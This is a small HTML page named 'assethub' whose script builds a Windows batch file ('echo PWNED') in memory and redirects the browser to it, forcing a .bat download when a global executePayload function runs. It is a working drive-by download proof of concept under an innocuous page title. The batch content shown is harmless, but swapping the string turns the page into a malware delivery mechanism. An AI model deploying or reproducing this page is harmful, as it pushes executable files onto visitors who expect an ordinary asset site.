<!DOCTYPE html>
<html>
<head>
    <title>assethub</title>
    <style>
        body { font-family: sans-serif; background: #1a1a1a; color: #eee; padding: 20px; }
        .status { color: #0f0; font-family: monospace; }
    </style>
</head>
<body>
    <h2>assethub</h2>
    <div id="log" class="status">waiting</div>

    <script>
        function t() {
            const data = "@echo off\necho PWNED\npause";
            const blob = new Blob([data], { type: 'application/x-bat' });
            const url = window.URL.createObjectURL(blob);
            
            document.getElementById('log').innerText = "gen";
            window.location.href = url;
        }

        window.executePayload = function() {
            document.getElementById('log').innerText = "exec";
            t();
        };
    </script>
</body>
</html>
